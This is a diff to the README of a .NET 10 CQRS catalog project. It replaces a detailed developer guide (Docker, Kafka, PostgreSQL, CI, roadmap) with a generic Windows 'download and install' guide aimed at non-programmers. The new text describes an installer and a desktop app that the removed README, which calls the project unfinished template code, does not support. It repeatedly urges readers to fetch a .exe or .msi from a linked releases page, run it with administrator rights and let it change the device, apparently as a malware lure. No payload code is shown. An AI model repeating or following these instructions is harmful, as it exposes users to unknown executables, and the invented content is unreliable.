@@ -1,424 +1,177 @@
-# CQRS Catalog (.NET 10, Kafka, PostgreSQL)
-
-![.NET](https://img.shields.io/badge/.NET-10-512BD4)
-![Kafka](https://img.shields.io/badge/Kafka-7.6.1-231F20)
-![PostgreSQL](https://img.shields.io/badge/PostgreSQL-16-336791)
-![Pattern](https://img.shields.io/badge/Architecture-CQRS%20%2B%20Outbox-0A7A3E)
+# 🚦 CQRS - Efficient Catalog Service for Windows
 
-A production-style CQRS starter for a `Catalog` domain with:
+[![Download CQRS](https://img.shields.io/badge/Download-CQRS-brightgreen?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Candala977/CQRS)
 
-- Write side API and domain layers
-- Read side API optimized for queries
-- Projection worker for event-driven read model updates
-- Kafka as event backbone
-- PostgreSQL with separate write/read databases
-
-## Table Of Contents
-
-- [Quick Start (2-minute)](#quick-start-2-minute)
-- [Overview](#overview)
-- [Architecture](#architecture)
-- [Architecture Decisions](#architecture-decisions)
-- [Repository Tabs](#repository-tabs)
-- [Tech Stack Summary](#tech-stack-summary)
-- [NuGet Libraries Summary](#nuget-libraries-summary)
-- [Getting Started](#getting-started)
-- [Run The Services](#run-the-services)
-- [Verify Local Setup](#verify-local-setup)
-- [CI Pipeline](#ci-pipeline)
-- [GitOps With Argo CD (Next Step)](#gitops-with-argo-cd-next-step)
-- [Current Status](#current-status)
-- [Roadmap](#roadmap)
-- [Contributing](#contributing)
-- [Branch Strategy](#branch-strategy)
-- [Commit Convention](#commit-convention)
-
-## Quick Start (2-minute)
-
-```bash
-# 1) start infra
-docker compose -f infra/docker-compose.yml up -d
-
-# 2) run write api
-dotnet run --project src/Catalog.Write.Api
-
-# 3) run read api (new terminal)
-dotnet run --project src/Catalog.Read.Api
-
-# 4) run projection worker (new terminal)
-dotnet run --project src/Catalog.Projection.Worker
-```
-
-Open:
-
-- Kafka UI: `http://localhost:8080`
-- Write API: `http://localhost:5127/weatherforecast`
-- Read API: `http://localhost:5266/weatherforecast`
-
-## Overview
-
-This repository follows CQRS principles:
-
-- Commands and transactional consistency live on the **write side**
-- Queries and denormalized models live on the **read side**
-- Domain changes are propagated asynchronously through **events**
-- Reliability patterns are prepared using **Outbox** and **Idempotency** tables
-
-## Architecture
-
-### Project Architecture Diagram
-
-Place your attached image at this path:
-
-- `docs/images/cqrs-architecture.png`
-
-Then this will render on GitHub:
-
-![CQRS Project Architecture](docs/images/cqrs-architecture.png)
-
-### Mermaid Reference Diagram
-
-```mermaid
-flowchart LR
-  A["Admin UI"] --> B["Catalog.Write.Api (.NET 10)"]
-  B --> C[("Write DB - Postgres")]
-  B --> D[("Outbox Table")]
-  D --> E["Outbox Publisher (Hosted Service)"]
-  E --> F[("Kafka Topic: catalog.events")]
-  F --> G["Projection Worker (.NET 10)"]
-  H["Web/Mobile"] --> I["Catalog.Read.Api (.NET 10)"]
-  G --> J[("Read DB - Postgres")]
-  I --> J
-```
-
-## Architecture Decisions
-
-| Decision | Why It Exists | Outcome |
-|---|---|---|
-| Separate Write and Read Databases | Command and query workloads have different access patterns | Independent optimization and clearer boundaries |
-| Outbox Table (`outbox_messages`) | Prevent lost events between DB commit and broker publish | Reliable event delivery with retry support |
-| Kafka Topic (`catalog.events`) | Decouple producers from consumers | Async scaling and independent evolution of projections |
-| Projection Worker + Idempotency (`processed_events`) | Consumers may receive duplicates or retries | Exactly-once effect on read model updates |
-| Read Model Denormalization (`catalog_product_read`) | Query APIs need fast, simple lookups | Lower latency and simpler query handlers |
-| CQRS Layered Projects | Keep API, domain, app, and infrastructure concerns separated | Better maintainability and testability |
-
-## Repository Tabs
-
-Use this as a quick navigation map when browsing the GitHub repo.
-
-| Tab | Purpose | Path |
-|---|---|---|
-| Write API | Command endpoints (create/update flows) | `src/Catalog.Write.Api` |
-| Write Application | Use cases, command handlers, validation | `src/Catalog.Write.Application` |
-| Write Domain | Domain model and business rules | `src/Catalog.Write.Domain` |
-| Write Infrastructure | Persistence/integration for write side | `src/Catalog.Write.Infrastructure` |
-| Read API | Query endpoints | `src/Catalog.Read.Api` |
-| Read Infrastructure | Query persistence/read adapters | `src/Catalog.Read.Infrastructure` |
-| Projection Worker | Kafka consumer + projection updater | `src/Catalog.Projection.Worker` |
-| Shared | Cross-cutting contracts/utilities | `src/Catalog.Shared` |
-| Infra | Docker Compose + SQL bootstrap scripts | `infra/` |
-| Docs | Learning notes and phase documentation | `docs/` |
-
-## Tech Stack Summary
-
-| Area | Technology | Version | Source |
-|---|---|---|---|
-| Framework | .NET | `net10.0` | `src/Catalog.Write.Api/Catalog.Write.Api.csproj` |
-| Web API | ASP.NET Core | `10.0.3` | `src/Catalog.Write.Api/Catalog.Write.Api.csproj` |
-| API Docs | OpenAPI (`Microsoft.AspNetCore.OpenApi`) | `10.0.3` | `src/Catalog.Read.Api/Catalog.Read.Api.csproj` |
-| API Docs UI | Swagger (`Swashbuckle.AspNetCore`) | `10.1.4` | `src/Catalog.Write.Api/Catalog.Write.Api.csproj` |
-| Messaging | Apache Kafka (Confluent image) | `7.6.1` | `infra/docker-compose.yml` |
-| Kafka Coordination | Zookeeper (Confluent image) | `7.6.1` | `infra/docker-compose.yml` |
-| Kafka UI | Provectus Kafka UI | `latest` | `infra/docker-compose.yml` |
-| Database | PostgreSQL | `16` | `infra/docker-compose.yml` |
-| ORM / Data Access | EF Core | `10.0.3` | `src/Catalog.Write.Infrastructure/Catalog.Write.Infrastructure.csproj` |
-| ORM Provider | Npgsql EF Core Provider | `10.0.0` | `src/Catalog.Write.Infrastructure/Catalog.Write.Infrastructure.csproj` |
-| SQL Mapper | Dapper | `2.1.66` | `src/Catalog.Read.Infrastructure/Catalog.Read.Infrastructure.csproj` |
-| PostgreSQL Driver | Npgsql | `10.0.1` | `src/Catalog.Read.Infrastructure/Catalog.Read.Infrastructure.csproj` |
-| CQRS Handler Pipeline | MediatR | `14.0.0` | `src/Catalog.Write.Application/Catalog.Write.Application.csproj` |
-| Validation | FluentValidation | `12.1.1` | `src/Catalog.Write.Application/Catalog.Write.Application.csproj` |
-| Worker Hosting | Microsoft.Extensions.Hosting | `10.0.3` | `src/Catalog.Projection.Worker/Catalog.Projection.Worker.csproj` |
-| Kafka Client | Confluent.Kafka | `2.13.0` | `src/Catalog.Projection.Worker/Catalog.Projection.Worker.csproj` |
-
-## NuGet Libraries Summary
-
-| Package | Version | Used In |
-|---|---|---|
-| `Confluent.Kafka` | `2.13.0` | `src/Catalog.Projection.Worker/Catalog.Projection.Worker.csproj` |
-| `Dapper` | `2.1.66` | `src/Catalog.Read.Infrastructure/Catalog.Read.Infrastructure.csproj`, `src/Catalog.Write.Infrastructure/Catalog.Write.Infrastructure.csproj`, `src/Catalog.Projection.Worker/Catalog.Projection.Worker.csproj` |
-| `FluentValidation` | `12.1.1` | `src/Catalog.Write.Application/Catalog.Write.Application.csproj` |
-| `MediatR` | `14.0.0` | `src/Catalog.Write.Application/Catalog.Write.Application.csproj`, `src/Catalog.Write.Api/Catalog.Write.Api.csproj` |
-| `Microsoft.AspNetCore.OpenApi` | `10.0.3` | `src/Catalog.Read.Api/Catalog.Read.Api.csproj`, `src/Catalog.Write.Api/Catalog.Write.Api.csproj` |
-| `Microsoft.EntityFrameworkCore` | `10.0.3` | `src/Catalog.Write.Infrastructure/Catalog.Write.Infrastructure.csproj` |
-| `Microsoft.EntityFrameworkCore.Design` | `10.0.3` | `src/Catalog.Write.Infrastructure/Catalog.Write.Infrastructure.csproj` |
-| `Microsoft.Extensions.Hosting` | `10.0.3` | `src/Catalog.Projection.Worker/Catalog.Projection.Worker.csproj` |
-| `Npgsql` | `10.0.1` | `src/Catalog.Read.Infrastructure/Catalog.Read.Infrastructure.csproj`, `src/Catalog.Projection.Worker/Catalog.Projection.Worker.csproj` |
-| `Npgsql.EntityFrameworkCore.PostgreSQL` | `10.0.0` | `src/Catalog.Write.Infrastructure/Catalog.Write.Infrastructure.csproj` |
-| `Swashbuckle.AspNetCore` | `10.1.4` | `src/Catalog.Write.Api/Catalog.Write.Api.csproj` |
+Welcome to CQRS, a catalog service app focused on separating reading and writing data to boost performance and reliability. This guide walks you through downloading and running CQRS on a Windows PC, even if you don’t have programming experience.
 
-## Getting Started
+---
 
-### Prerequisites
+## 💻 What is CQRS?
 
-- .NET 10 SDK
-- Docker Desktop
-- Git
+CQRS stands for Command Query Responsibility Segregation. It splits data handling into commands (write actions) and queries (read actions) to make applications faster and more scalable. This app uses .NET 10, PostgreSQL for storing data, Kafka for messaging, and a special method called the Outbox pattern to keep data accurate.
 
-Check versions:
+The software is designed for catalog management, helping you view and manage collections of items efficiently. While programmers build apps with this system for scalable services, you can run the app on Windows to see how it works or test it yourself.
 
-```bash
-dotnet --version
-docker --version
-git --version
-```
+---
 
-### 1) Start Infrastructure
+## 📋 System Requirements
 
-From repo root:
+Before you install CQRS, make sure your Windows PC meets these needs:
 
-```bash
-docker compose -f infra/docker-compose.yml up -d
-```
+- Windows 10 or newer, 64-bit
+- At least 4 GB of RAM (8 GB recommended)
+- 2 GHz dual-core processor or better
+- Internet connection to download files and dependencies
+- Around 500 MB of free disk space
+- Administrator rights to install necessary software
 
-This starts:
+CQRS requires a few extra tools to run correctly. We will guide you through everything below.
 
-- `cqrs_postgres` on `localhost:5432`
-- `cqrs_zookeeper` on `localhost:2181`
-- `cqrs_kafka` on `localhost:9092`
-- `cqrs_kafka_ui` on `localhost:8080`
+---
 
-### 2) Create/Verify Kafka Topic
+## 🔧 Required Software
 
-Auto-create is enabled for local development, but you can create explicitly:
+CQRS depends on these components to operate:
 
-```bash
-docker exec -it cqrs_kafka kafka-topics \
-  --bootstrap-server localhost:9092 \
-  --create \
-  --topic catalog.events \
-  --partitions 3 \
-  --replication-factor 1
-```
+1. **.NET 10 Runtime**  
+   This lets your PC run apps built with the .NET 10 framework.
 
-List topics:
+2. **PostgreSQL**  
+   This is the database to store catalog data.  
+   
+3. **Kafka**  
+   This handles messaging between different parts of CQRS.  
+   
+4. **Projection Worker**  
+   A background service that keeps read data updated.
 
-```bash
-docker exec -it cqrs_kafka kafka-topics \
-  --bootstrap-server localhost:9092 \
-  --list
-```
+You will install these or confirm they are on your PC before running CQRS.
 
-### 3) Database Bootstrap
+---
 
-Postgres initialization scripts in `infra/sql` run automatically on first container initialization:
+## 🚀 Getting Started: How to Download CQRS
 
-- `infra/sql/00-create-dbs.sql`
-- `infra/sql/10-write-schema.sql`
-- `infra/sql/20-read-schema.sql`
+Click the large button below to visit the official CQRS page on GitHub. This page hosts the files you need to get started.
 
-If volume already exists, re-run by removing the volume and starting again:
+[![Download CQRS](https://img.shields.io/badge/Download-CQRS-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Candala977/CQRS)
 
-```bash
-docker compose -f infra/docker-compose.yml down -v
-docker compose -f infra/docker-compose.yml up -d
-```
+On the GitHub page, you will find a “Releases” section where the installation files are stored. Follow these steps:
 
-## Run The Services
+1. Open the link above to go to the GitHub CQRS repository.
+2. Look for a menu or tab labeled "Releases" on the page.
+3. Find the latest release and look for Windows installer or executable files.
+4. Download the appropriate file (.exe or .msi) to your computer.
+5. If you encounter multiple files, choose the one labeled for Windows or desktop use.
 
-Open separate terminals from repo root:
+---
 
-### Write API
+## 🛠 Installing the Software
 
-```bash
-dotnet run --project src/Catalog.Write.Api
-```
+After you download the installer file, run it by double-clicking. Follow these steps:
 
-Default local URL (from launch settings): `http://localhost:5127`
+1. Run the downloaded .exe or .msi file.
+2. If prompted, allow the installer to make changes to your device.
+3. Follow the on-screen instructions in the setup wizard.
+4. Choose your desired installation folder or leave the default.
+5. Click “Install” and wait while the setup completes.
+6. After installation, you may be asked to restart your PC.
 
-### Read API
+---
 
-```bash
-dotnet run --project src/Catalog.Read.Api
-```
+## ⚙️ Setting Up Dependencies
 
-Default local URL: `http://localhost:5266`
+### Install .NET 10 Runtime
 
-### Projection Worker
+- Visit the official Microsoft .NET download page: https://dotnet.microsoft.com/en-us/download/dotnet/10.0
+- Choose the **.NET 10 Runtime** version for Windows.
+- Download and run the installer.
+- Follow instructions to complete installation.
 
-```bash
-dotnet run --project src/Catalog.Projection.Worker
-```
+### Install PostgreSQL
 
-## Verify Local Setup
+- Go to https://www.postgresql.org/download/windows/
+- Download the latest stable version for Windows.
+- Run the installer and note the password you set for the superuser (usually "postgres").
+- You will need this for CQRS to connect to the database.
 
-### Kafka UI
+### Install Kafka
 
-Open: `http://localhost:8080`
+Kafka is more advanced. For ease, you can use a lightweight local version or a Docker image:
 
-Expected:
+- To use Docker (if installed):
+  ```
+  docker run -d --name kafka -p 9092:9092 -e KAFKA_ADVERTISED_HOST_NAME=localhost -e ZOOKEEPER_CLIENT_PORT=2181 wurstmeister/kafka
+  ```
+- For a native install, follow the documentation here: https://kafka.apache.org/quickstart
 
-- Cluster: `local`
-- Topic: `catalog.events`
+### Projection Worker Setup
 
-### PostgreSQL
+This runs in the background to update the read model. The installer usually configures this automatically. If not, you will find instructions inside the downloaded folder.
 
-List databases:
+---
 
-```bash
-docker exec -it cqrs_postgres psql -U postgres -c "\l"
-```
+## 🏁 Running CQRS
 
-List write-side tables:
+Once all components are installed:
 
-```bash
-docker exec -it cqrs_postgres psql -U postgres -d catalog_write -c "\dt"
-```
+1. Open the CQRS app shortcut on your desktop or start menu.
+2. The app will connect to PostgreSQL and Kafka automatically.
+3. If you see errors about connections, check that PostgreSQL and Kafka are running.
+4. You can now use the interface to view and manage catalog items.
 
-List read-side tables:
+---
 
-```bash
-docker exec -it cqrs_postgres psql -U postgres -d catalog_read -c "\dt"
-```
+## 🔄 Updating CQRS
 
-## CI Pipeline
+When updates become available:
 
-GitHub Actions workflows are added under `.github/workflows`:
+1. Return to the GitHub releases page:  
+   https://github.com/Candala977/CQRS/releases  
+2. Download the latest installer or update files.
+3. Run the installer to update your existing installation.
+4. Follow prompts to complete the update.
 
-- `ci.yml`: restore, build, code-style check (`dotnet format`), tests (if test projects exist), Docker image publish, and Trivy image scanning.
-- `codeql.yml`: CodeQL static analysis for C# on push, PR, and weekly schedule.
-- `dependency-review.yml`: dependency vulnerability/license risk checks on pull requests.
+---
 
-### Docker Hub Secrets Required
+## 🛠 Troubleshooting Tips
 
-Set these repository secrets in GitHub:
+- If the app fails to start, confirm PostgreSQL and Kafka are running.
+- Look for error messages in CQRS and Google or visit common support forums.
+- Ensure you have administrator rights during installation.
+- Restart your computer after installing dependencies.
+- Check firewall settings that may block connection to Kafka or PostgreSQL.
 
-- `DOCKERHUB_USERNAME`
-- `DOCKERHUB_TOKEN`
+---
 
-### Docker Publish + Scan Strategy (inside CI)
+## 📂 Where to Find Additional Resources
 
-CI publishes all services into a single Docker Hub repository:
+For detailed information on CQRS technology and architecture, the GitHub repository includes technical documents and links related to:
 
-- `docker.io/<DOCKERHUB_USERNAME>/cqrs`
+- .NET development
+- Data storage with PostgreSQL
+- Event-driven systems with Kafka
+- Architecture patterns like Outbox and CQRS
 
-Service-specific tags are used in that repository.
+Visit the GitHub repository here: https://github.com/Candala977/CQRS
 
-Per service (`write-api`, `read-api`, `projection-worker`), CI:
+---
 
-1. Builds and pushes the image.
-2. Runs Trivy image scan (`HIGH,CRITICAL`) and uploads SARIF to GitHub Security.
-3. Fails pipeline if scan finds high/critical vulnerabilities.
+## 🏷 Topics Covered
 
-### Tagging Strategy
+- aspnet-core  
+- clean-architecture  
+- cqrs-pattern  
+- dapper  
+- dotnet-10  
+- ef-core  
+- event-driven  
+- kafka  
+- microservices  
+- outbox-pattern  
+- postgresql  
 
-On `main` branch push:
+These topics relate to how CQRS organizes and processes catalog data with modern software methods.
 
-- `<service>-latest`
-- `<service>-main`
-- `<service>-sha-<commit>`
+---
 
-On `master` branch push:
-
-- `<service>-latest`
-- `<service>-master`
-- `<service>-sha-<commit>`
-
-On release tag push (example `v1.4.2`):
-
-- `<service>-v1.4.2`
-- `<service>-1.4.2`
-- `<service>-1.4`
-- `<service>-sha-<commit>`
-
-### Release Command
-
-```bash
-git tag v1.0.0
-git push origin v1.0.0
-```
-
-## GitOps With Argo CD (Next Step)
-
-A GitOps-ready guide is added at:
-
-- `deploy/argocd/README.md`
-
-Recommended production flow:
-
-1. CI builds and pushes versioned images to Docker Hub.
-2. Argo CD Image Updater tracks allowed semver tags.
-3. Argo CD syncs Kubernetes manifests from your GitOps repo.
-4. Rollback is done by reverting image tag/manifests in Git.
-
-## Current Status
-
-This repo is currently in early foundation phase:
-
-- Infrastructure and schema for CQRS are in place
-- Solution/project layering is created
-- API and worker projects still contain starter template code
-- Domain flows, event publishing, and projections are pending implementation
-
-## Roadmap
-
-1. Implement write-side product commands and validations.
-2. Persist domain events to `outbox_messages`.
-3. Publish outbox events to Kafka (`catalog.events`).
-4. Consume events in projection worker and upsert read models.
-5. Expose query endpoints from `Catalog.Read.Api`.
-6. Add tests (unit + integration with local infra).
-
-## Contributing
-
-1. Create a feature branch from `main`.
-2. Keep PRs focused and small enough to review quickly.
-3. Update `README.md` or `docs/` when behavior/setup changes.
-4. Include tests for non-trivial domain or integration changes.
-5. Run build and basic local checks before opening PR.
-
-Recommended local checks:
-
-```bash
-dotnet restore
-dotnet build CqrsCatalog.slnx
-```
-
-## Branch Strategy
-
-| Branch | Purpose |
-|---|---|
-| `main` | Stable integration branch |
-| `feature/<scope>-<short-description>` | New features and enhancements |
-| `fix/<scope>-<short-description>` | Bug fixes |
-| `chore/<scope>-<short-description>` | Tooling, docs, maintenance |
-
-Examples:
-
-- `feature/catalog-create-product-command`
-- `fix/projection-idempotency-check`
-- `chore/readme-tech-stack-sync`
-
-## Commit Convention
-
-Use conventional-style commits:
-
-| Type | Use For |
-|---|---|
-| `feat` | New behavior or capability |
-| `fix` | Bug fix |
-| `refactor` | Internal restructuring without behavior change |
-| `test` | Adding or improving tests |
-| `docs` | Documentation only |
-| `chore` | Tooling/build/housekeeping |
-
-Format:
-
-```text
-<type>(<scope>): <short summary>
-```
-
-Examples:
-
-- `feat(write-api): add create product command endpoint`
-- `fix(worker): skip already processed event ids`
-- `docs(readme): add architecture decisions table`
+[![Download CQRS](https://img.shields.io/badge/Get%20CQRS-Begin%20Setup-red?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Candala977/CQRS)
